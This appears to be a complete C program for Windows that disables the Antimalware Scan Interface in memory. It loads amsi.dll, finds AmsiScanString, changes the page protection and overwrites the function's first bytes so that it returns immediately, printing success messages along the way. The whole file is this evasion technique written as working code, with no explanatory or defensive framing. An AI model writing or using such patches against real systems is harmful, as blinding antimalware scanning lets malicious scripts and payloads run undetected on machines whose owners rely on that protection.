#include <windows.h>
#include <stdio.h>

int main(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return -1;
    }

    FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
    if (!pAmsiScanString) {
        printf("[-] Failed to resolve AmsiScanString\n");
        return -1;
    }

    printf("[+] AmsiScanString located at: 0x%p\n", pAmsiScanString);

    unsigned char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

    DWORD oldProtect;
    if (VirtualProtect((LPVOID)pAmsiScanString, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pAmsiScanString, patch, sizeof(patch));
        VirtualProtect((LPVOID)pAmsiScanString, sizeof(patch), oldProtect, &oldProtect);
        printf("[+] Successfully patched AmsiScanString!\n");
    } else {
        printf("[-] Failed to change memory protection.\n");
    }

    return 0;
}
